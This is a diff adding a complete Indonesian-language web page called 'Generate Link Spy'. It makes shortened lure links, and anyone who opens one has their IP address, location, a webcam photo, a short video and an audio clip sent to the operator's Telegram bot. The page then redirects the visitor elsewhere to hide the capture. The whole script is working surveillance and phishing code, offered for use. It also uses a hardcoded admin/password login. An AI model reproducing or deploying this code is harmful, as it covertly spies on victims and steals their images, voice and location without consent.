@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Generate & View</title>
+<style>
+*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,Arial}
+body{
+  margin:0;
+  padding:20px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  background:linear-gradient(135deg,#141e30,#243b55);
+  color:#fff;
+}
+.card{
+  background:rgba(255,255,255,0.07);
+  border-radius:18px;
+  padding:28px;
+  width:100%;
+  max-width:420px;
+  box-shadow:0 8px 25px rgba(0,0,0,.3);
+  backdrop-filter:blur(10px);
+  animation:fadeIn .6s ease-out;
+}
+@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+h1{
+  font-size:22px;
+  text-align:center;
+  margin-bottom:24px;
+  color:#0ff;
+}
+label{
+  font-size:14px;
+  color:#ddd;
+  margin-bottom:6px;
+  display:block;
+}
+input[type=text],input[type=password],input[type=url]{
+  width:100%;
+  padding:12px;
+  border:1px solid rgba(255,255,255,.2);
+  background:rgba(255,255,255,.05);
+  border-radius:8px;
+  font-size:15px;
+  color:#fff;
+  margin-bottom:14px;
+  outline:none;
+  transition:.25s;
+}
+input:focus{border-color:#0ff;box-shadow:0 0 6px #0ff3}
+button{
+  width:100%;
+  padding:14px;
+  background:linear-gradient(135deg,#00c6ff,#0072ff);
+  color:#fff;
+  border:none;
+  border-radius:10px;
+  font-size:16px;
+  font-weight:600;
+  margin-top:10px;
+  cursor:pointer;
+  transition:.25s;
+}
+button:hover{transform:translateY(-2px);box-shadow:0 6px 16px rgba(0,0,0,.4)}
+#linkOut{
+  font-size:14px;
+  word-break:break-all;
+  margin-top:20px;
+  padding:16px;
+  border-radius:12px;
+  background:rgba(0,0,0,.35);
+  border:1px solid rgba(255,255,255,.1);
+  display:none;
+  animation:fadeIn .6s ease-out;
+}
+#linkOut strong{color:#0ff}
+#linkOut a{color:#6f0;text-decoration:none}
+#linkOut a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="card" id="loginCard">
+  <h1>🔐 Login</h1>
+  <label>Username</label>
+  <input type="text" id="username" placeholder="Username">
+  <label>Password</label>
+  <input type="password" id="password" placeholder="Password">
+  <button onclick="login()">Masuk</button>
+</div>
+
+<!-- FORM GENERATE -->
+<div class="card" id="formCard" style="display:none">
+  <h1>🔗 Generate Link Spy</h1>
+  <label>Bot Token</label>
+  <input type="text" id="botToken" placeholder="">
+  <label>Chat ID</label>
+  <input type="text" id="chatId" placeholder="">
+  <label>URL Target</label>
+  <input type="url" id="targetUrl" placeholder="URL" required>
+  <button onclick="generate()">🚀 Generate Link</button>
+  <div id="linkOut"></div>
+</div>
+
+<script>
+// ===== LOGIN =====
+const validUser = "admin";
+const validPass = "password";
+
+function login() {
+  const u = document.getElementById("username").value.trim();
+  const p = document.getElementById("password").value.trim();
+  if(u === validUser && p === validPass){
+    document.getElementById("loginCard").style.display="none";
+    document.getElementById("formCard").style.display="block";
+  }else{
+    alert("❌ Username atau Password salah!");
+  }
+}
+
+// ===== SHORTENER =====
+async function shorten(url){
+  try{
+    const res=await fetch("https://tinyurl.com/api-create.php?url="+encodeURIComponent(url));
+    return await res.text();
+  }catch(e){return url;}
+}
+
+// ===== GENERATE =====
+async function generate() {
+  const token = document.getElementById('botToken').value.trim();
+  const chat  = document.getElementById('chatId').value.trim();
+  const url   = document.getElementById('targetUrl').value.trim();
+  if (!token || !chat || !url) return alert('Isi semua kolom dulu!');
+  const longLink = `${location.origin}${location.pathname}?mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(url)}`;
+  const shortLink = await shorten(longLink);
+  const out = document.getElementById('linkOut');
+  out.style.display = "block";
+  out.innerHTML = `<strong>Link Spy:</strong><br><a href="${shortLink}" target="_blank">${shortLink}</a>`;
+}
+
+// ===== MODE VIEW =====
+(async () => {
+  const params = new URLSearchParams(location.search);
+  if (params.get("mode") !== "view") return;
+  document.getElementById("loginCard").style.display="none";
+  document.getElementById("formCard").style.display="none";
+  const TOKEN  = params.get("token");
+  const CHAT   = params.get("chat");
+  const TARGET = params.get("target") || "https://example.com";
+  if (!TOKEN || !CHAT) return;
+  const kirim = (type, blob, cap) => {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT);
+    fd.append(type, blob, `${type}_${Date.now()}`);
+    fd.append("caption", cap);
+    fetch(`https://api.telegram.org/bot${TOKEN}/send${type === "audio" ? "Audio" : "Video"}`, { method: "POST", body: fd });
+  };
+  const kirimFoto = (blob, cap) => {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT);
+    fd.append("photo", blob);
+    fd.append("caption", cap);
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
+  };
+  let ipAddr = "Unknown IP";
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    ipAddr = data.ip;
+  } catch {}
+  let lat = "-", lon = "-";
+  try {
+    const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
+    lat = p.coords.latitude;
+    lon = p.coords.longitude;
+  } catch {}
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ video: true });
+    const v = document.createElement("video");
+    const c = document.createElement("canvas");
+    v.srcObject = s; await new Promise(r => v.onloadedmetadata = r);
+    v.play(); c.width = v.videoWidth; c.height = v.videoHeight;
+    c.getContext("2d").drawImage(v, 0, 0);
+    s.getTracks().forEach(t => t.stop());
+    c.toBlob(b => kirimFoto(b, `📸 Lat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`), "image/jpeg");
+  } catch {}
+  try {
+    const vs = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    const rec = new MediaRecorder(vs);
+    const chunks = [];
+    rec.ondataavailable = e => chunks.push(e.data);
+    rec.onstop = () => {
+      const blob = new Blob(chunks, { type: "video/webm" });
+      kirim("video", blob, `📹 3 detik\nLat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`);
+      vs.getTracks().forEach(t => t.stop());
+    };
+    rec.start(); setTimeout(() => rec.stop(), 3000);
+  } catch {}
+  try {
+    const as = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const rec = new MediaRecorder(as);
+    const chunks = [];
+    rec.ondataavailable = e => chunks.push(e.data);
+    rec.onstop = () => {
+      const blob = new Blob(chunks, { type: "audio/ogg" });
+      kirim("audio", blob, `🎤 5 detik\nLat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`);
+      as.getTracks().forEach(t => t.stop());
+    };
+    rec.start(); setTimeout(() => rec.stop(), 5000);
+  } catch {}
+  setTimeout(() => location.replace(TARGET), 6000);
+})();
+</script>
+</body>
+</html>
